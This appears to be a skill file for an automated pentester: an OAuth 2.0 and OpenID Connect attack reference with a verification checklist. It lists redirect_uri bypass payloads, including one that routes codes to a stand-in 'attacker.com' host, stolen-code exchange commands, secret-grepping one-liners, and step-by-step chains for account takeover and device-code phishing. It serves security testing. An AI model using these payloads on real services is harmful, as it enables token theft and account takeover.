---
name: oauth_vulnerabilities
description: OAuth 2.0 and OIDC vulnerability testing including redirect_uri manipulation, token leakage, PKCE downgrade, and account takeover
---

# OAuth Vulnerabilities

OAuth 2.0 and OpenID Connect flows have multiple redirect-based handshakes creating opportunities for token theft, CSRF, and account takeover. Focus on redirect_uri validation, state/PKCE enforcement, token handling, and provider-specific weaknesses.

## Attack Surface

**Flows:** Authorization Code, Implicit (deprecated), Client Credentials, Device Code, PKCE
**Key Parameters:** `redirect_uri`, `state`, `client_id`, `scope`, `response_type`, `code_challenge`/`code_challenge_method`

## redirect_uri Manipulation

### Open Redirect Chaining

```
# Legitimate: https://app.com/callback
# Path traversal:
https://app.com/callback/../attacker
https://app.com/callback/..%2fattacker
# Open redirect on same domain:
https://app.com/redirect?url=https://attacker.com/oauth-steal
# Encoded bypass:
https://app.com/callback%00.attacker.com
```

### Wildcard Bypass

```python
test_uris = [
    "https://app.com/callback/",           # trailing slash
    "https://app.com/callback?",            # empty query
    "https://app.com/callback#",            # empty fragment
    "https://app.com/callback/anything",    # subpath
    "https://app.com/callback%2f",          # encoded slash
    "https://app.com/callback%00",          # null byte
    "https://APP.COM/callback",             # case variation
    "https://app.com./callback",            # trailing dot
    "http://app.com/callback",              # HTTP downgrade
    "https://app.com:443/callback",         # explicit port
]
```

### Subdomain Takeover + OAuth

```
1. Find abandoned CNAME pointing to expired cloud service
2. Register cloud service to claim subdomain
3. Register OAuth client with redirect_uri=https://sub.target.com/callback
4. Intercept auth codes via hijacked subdomain
```

## Token Leakage

### Via Referer Header

```
# If callback page loads external resources, Referer leaks auth code
# Check Referrer-Policy:
curl -sI https://app.com/callback | grep -i referrer-policy
# Safe: no-referrer, same-origin | Unsafe: no-referrer-when-downgrade (default), unsafe-url
```

### Via Error Responses

```
# Some providers include tokens in error parameters:
https://app.com/callback?error=access_denied&access_token=***
https://app.com/callback#error=...&access_token=LEAKED
```

## Authorization Code Interception

```
1. Attacker initiates OAuth with victim's client_id
2. Victim logs in and authorizes
3. Provider redirects: https://app.com/callback?code=***&state=...
4. Attacker intercepts code (network, XSS, open redirect)
5. Attacker exchanges code for tokens
# Pre-conditions: No PKCE (or PKCE downgrade), weak/no state validation
```

### Code Reuse Test

```bash
# Send same code twice in token exchange
curl -X POST https://provider.com/oauth/token \
  -d "grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=https://app.com/callback&client_id=xxx&client_secret=yyy"
```

## PKCE Downgrade Attacks

### Forcing Without PKCE

```
# If server supports both PKCE and non-PKCE:
GET /authorize?response_type=code&client_id=xxx&redirect_uri=yyy
# If it returns code without code_challenge → PKCE is optional → downgrade succeeds
```

### Weak code_challenge_method

```
# Test if server accepts plain instead of S256:
GET /authorize?...&code_challenge=VERIFIER_PLAINTEXT&code_challenge_method=plain
# If accepted, attacker intercepting code can use plaintext verifier
```

### Low-Entropy Verifier

```python
# Some implementations use weak random for verifier
# If < 32 bytes entropy and no rate-limit on token exchange, brute-force viable
import string
charset = string.ascii_letters + string.digits + '-._~'
# Verifier: 43-128 chars from charset
```

## State Parameter Bypass

### Missing State

```bash
# Remove state from callback, check if it processes:
curl "https://app.com/callback?code=***"
```

### Predictable State

```python
# Test consistency across requests
for i in range(5):
    resp = requests.get(f"https://app.com/oauth/authorize?client_id=xxx&redirect_uri=yyy&response_type=code&scope=openid")
    state = parse_state_from_redirect(resp)
    print(f"State {i}: {state}")
# If sequential or timestamp-based → predictable
```

### State Fixation

```
1. Attacker starts OAuth, receives: ?code=ATTACKER_CODE&state=ATTACKER_STATE
2. Craft: https://target.com/callback?code=***&state=ATTACKER_STATE
3. Victim clicks (phishing/XSS)
4. If state not session-bound → attacker's code linked to victim's account
5. Attacker logs in via OAuth → accesses victim's account
```

## Implicit Flow Token Theft

```
# Token returned in URL fragment, never sent server-side by default
# Attack vectors:
- XSS on redirect_uri page → read window.location.hash
- OAuth token injection via fragment
- Cross-site token theft if page includes third-party JS
- Token in fragment + form action → some browsers leak to cross-origin
```

## Account Takeover via Linked OAuth

### Pre-Account Takeover

```
1. Attacker creates account with victim's email (no verification)
2. Attacker links their OAuth provider to this account
3. Victim later signs in via OAuth with same email
4. If app matches on email only → victim gets attacker's account
5. Attacker's OAuth identity already linked → persistent access
```

### Email Spoofing Check

```python
# Check if provider trusts email claim without verification
# OAuth response should include email_verified: true
# If not present, email claim should not be trusted
```

## CSRF in OAuth Flows

```
1. Attacker starts OAuth, receives: ?code=ATTACKER_CODE&state=ATTACKER_STATE
2. Sends victim: https://app.com/callback?code=***&state=ATTACKER_STATE
   (in img tag, link, etc.)
3. If state not session-bound: victim's session processes callback
4. Attacker's OAuth identity linked to victim's account
```

## Device Code Flow Abuse

```
1. Attacker requests device code: POST /device/code {client_id, scope}
2. Gets: {device_code, user_code: "WDJB-MJHT", verification_uri: "https://provider.com/device"}
3. Phishing: "Go to https://provider.com/device and enter code: WDJB-MJHT"
4. Victim authorizes
5. Attacker polls: POST /token {grant_type: device_code, device_code, client_id}
6. Receives access token for victim's account

# Rate limit test:
for i in $(seq 1 100); do
  curl -s -X POST https://provider.com/device/code -d "client_id=xxx&scope=openid"
done
```

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Intercept/modify OAuth flows, match-and-replace tokens |
| jwt_tool | JWT manipulation, algorithm confusion, key brute-force |
| Custom Python scripts | OAuth flow automation, redirect_uri fuzzing |
| ffuf | Fuzz redirect_uri variations |
| OAuth Tester (Burp ext) | Automated OAuth testing |

## Detection in Application Code

```bash
# Find OAuth endpoints in JS bundles
curl -s https://app.com/app.js | grep -oE 'https?://[^"'"'"']+/(authorize|token|oauth|openid)[^"'"'"']*'
# Check for implicit flow usage
curl -s https://app.com/app.js | grep -oE 'response_type=(token|id_token)'
# Find client secrets in JS (common misconfiguration)
curl -s https://app.com/app.js | grep -oE 'client_secret[=:]["'"'"'][^"'"'"']+'
```

## Verification Checklist

1. [ ] Map all OAuth providers and endpoints (authorize, token, userinfo, jwks)
2. [ ] Test redirect_uri validation with fuzzing
3. [ ] Verify state parameter is present, random, and session-bound
4. [ ] Check PKCE enforcement (required, not optional)
5. [ ] Test if auth codes are single-use
6. [ ] Verify token storage (httpOnly, secure cookies, not localStorage)
7. [ ] Check for token leakage via Referer on callback pages
8. [ ] Test OAuth-to-account linking logic for pre-account takeover
9. [ ] Verify email_verified is checked before trusting email claims
10. [ ] Test implicit flow if present (should be replaced with auth code + PKCE)
